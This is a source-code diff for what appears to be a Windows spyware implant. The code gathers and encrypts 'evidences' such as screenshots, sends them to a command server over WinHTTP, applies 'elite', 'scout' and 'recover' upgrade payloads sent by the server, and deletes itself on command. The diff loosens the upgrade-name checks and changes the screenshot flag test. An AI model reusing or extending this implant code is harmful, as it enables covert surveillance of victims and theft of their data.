@@ -27,11 +27,11 @@ extern PDEVICE_CONTAINER pDeviceContainer;
 extern PULONG uSynchro;
 
 BOOL SendInfo(LPWSTR pInfoString)
-{
+{	
 	PBYTE pHeaderBuffer;
 	ULONG uHeaderSize;
 	BOOL bRetVal = TRUE;
-
+	
 	// payload
 	PBYTE pCryptedString = (PBYTE)malloc(Align(wcslen(pInfoString)*sizeof(WCHAR), 16));
 	memset(pCryptedString, 0x0, Align(wcslen(pInfoString)*sizeof(WCHAR), 16));
@@ -74,7 +74,7 @@ BOOL SendInfo(LPWSTR pInfoString)
 
 	free(pCryptedString);
 	free(pBuffer);
-
+	
 	return bRetVal;
 }
 
@@ -162,7 +162,7 @@ BOOL SendEvidences()
 #endif
 	
 	// SCREENSHOT
-	if (SCREENSHOT_FLAG)
+	if (memcmp(SCREENSHOT_FLAG, "\x00\x00\x00\x00", sizeof(ULONG)))
 	{
 		ULONG uScreenShotLen;
 		PBYTE pJPEGBuffer = TakeScreenshot(&uScreenShotLen);
@@ -556,7 +556,8 @@ BOOL SyncWithServer()
 				ULONG uFileLength = *(PULONG) (((PBYTE)&pProtoUpgrade->pUpgradeNameBuffer) + pProtoUpgrade->uUpgradeNameLen);
 				PBYTE pFileBuffer = (PBYTE)(((PBYTE)&pProtoUpgrade->pUpgradeNameBuffer) + pProtoUpgrade->uUpgradeNameLen) + sizeof(ULONG);
 
-				if (!wcscmp(pUpgradeName, L"elite"))
+				//if (!wcscmp(pUpgradeName, L"elite"))
+				if (pUpgradeName[0] == L'e' && pUpgradeName[1] == L'l')
 				{
 					if (UpgradeElite(pUpgradeName, pFileBuffer, uFileLength))
 						uGonnaDie = 1;
@@ -566,7 +567,8 @@ BOOL SyncWithServer()
 						SendInfo(pMessage);
 					}
 				}
-				if (!wcscmp(pUpgradeName, L"scout"))
+				//if (!wcscmp(pUpgradeName, L"scout"))
+				if (pUpgradeName[0] == L's' && pUpgradeName[1] == L'c')
 				{
 					if (!UpgradeScout(pUpgradeName, pFileBuffer, uFileLength))
 					{
@@ -574,7 +576,8 @@ BOOL SyncWithServer()
 						SendInfo(pMessage);
 					}
 				}
-				if (!wcscmp(pUpgradeName, L"recover"))
+				//if (!wcscmp(pUpgradeName, L"recover"))
+				if (pUpgradeName[0] == L'r' && pUpgradeName[1] == L'e')
 				{
 					if (!UpgradeRecover(pUpgradeName, pFileBuffer, uFileLength))
 					{
@@ -609,13 +612,6 @@ BOOL SyncWithServer()
 		WinHTTPClose();
 		DeleteAndDie(TRUE);
 	}
-	/*
-	else if (uGonnaDie == 2)
-	{
-		WinHTTPClose();
-		ExitThread(0);
-	}
-	*/
 
 	free(pProtoMessage);
 	free(pInstanceId);
@@ -668,6 +664,7 @@ ULONG CommandHash(ULONG uProtoCmd, PBYTE pMessage, ULONG uMessageLen, PBYTE pEnc
 	Encrypt(pOutBuffer, uOutClear, pEncryptionKey, PAD_PKCS5);
 
 	*pOutBuff = pOutBuffer;
+	
 	return uOut;
 }
 
@@ -680,7 +677,7 @@ BOOL GetUserUniqueHash(PBYTE pUserHash, ULONG uHashSize)
 	DWORD dwLen=0;
 	LPSTR pStringSid;
 	BOOL bRetVal = FALSE;
-
+		
 	if (!pUserHash)
 		return FALSE;
 	memset(pUserHash, 0, uHashSize);
@@ -714,6 +711,7 @@ BOOL GetUserUniqueHash(PBYTE pUserHash, ULONG uHashSize)
 		}
 		CloseHandle(hToken);
 	}
+	
 	return bRetVal;
 }
 
